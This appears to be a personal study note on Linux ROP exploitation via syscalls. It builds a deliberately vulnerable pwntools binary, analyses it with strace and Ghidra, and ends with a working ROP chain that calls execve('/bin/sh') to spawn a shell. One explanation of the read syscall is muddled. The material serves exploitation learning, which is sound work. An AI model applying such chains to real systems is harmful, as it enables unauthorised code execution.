---
description: 09/22/2023
---

# Exploitation w/ Syscalls

## References

{% embed url="https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp/rop-syscall-execv" %}

{% embed url="https://ir0nstone.gitbook.io/notes/types/stack/syscalls/exploitation-with-syscalls" %}

**First, we'll create a file with Python/pwntools:**

```python
import os
from pwn import *


context.arch = 'amd64'
context.os = 'linux'

elf = ELF.from_assembly(
    '''
        mov rdi, 0;
        mov rsi, rsp;
        sub rsi, 8;
        mov rdx, 300;
        syscall;
        ret;
        
        pop rax;
        ret;
        pop rdi;
        ret;
        pop rsi;
        ret;
        pop rdx;
        ret;
    '''
)
elf.save('vuln')
os.system("chmod +x vuln")
```

It will first execute a `read()` syscall. This will read from a file descriptor (identifier for a file or other resource).

**We can see this with `strace`:**

```
strace ./vuln
execve("./vuln", ["./vuln"], 0x7ffd9782ca00 /* 22 vars */) = 0
read(0,
"\n", 300)
```

We can see `execve()` placing the value `0` into `RAX` (which the kernel checks), storing the value as a parameter (`0`) into `RDI` and calling `read()` or `0` which is the syscall number for `read()`.

## Analyzing Syscalls in Ghidra

Okay, so this was a little different.

We can see that the value, <mark style="color:yellow;">`0`</mark> <mark style="color:yellow;">is</mark> <mark style="color:yellow;">being moved onto the stack and being placed into the</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`RDI`</mark> <mark style="color:yellow;">register</mark>.

This is our <mark style="color:yellow;">invoke of the</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`read()`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">syscall since</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`0`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">is our syscall number</mark>.

We then write the value `300` (had to convert this from `0x12C`) to the stack using `RDX`.

Lastly, we `ret`.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption><p>Ghidra Analysis</p></figcaption></figure>

**We can add `"/bin/sh"` by:**&#x20;

```
echo -en "/bin/sh\x00" >> vuln
```

**After that, we can get the gadget address using `strings`:**

```
strings -t x vuln | grep bin
   1238 /bin/sh
```

We see the offset from the base to the string is `0x1238`.

## Exploitation

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Arming ourselves with the following information will allow us to get a shell.

```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

binsh = elf.address + 0x1238

POP_RAX = 0x10000018
POP_RDI = 0x1000001a
POP_RSI = 0x1000001c
POP_RDX = 0x1000001e
SYSCALL = 0x10000015

payload = flat(
    'A' * 8,
    POP_RAX,
    0x3b,
    POP_RDI,
    binsh,
    POP_RSI,
    0x0,
    POP_RDX,
    0X0,
    SYSCALL
)

p.sendline(payload)
p.interactive()
```

<mark style="color:red;">**Disclaimer**</mark>: Unfortunately and for the first time, I wasn't really fond of Ir0nstone's guide on this one, so I will be adding some more examples.

As a result, this is still a work in progress.
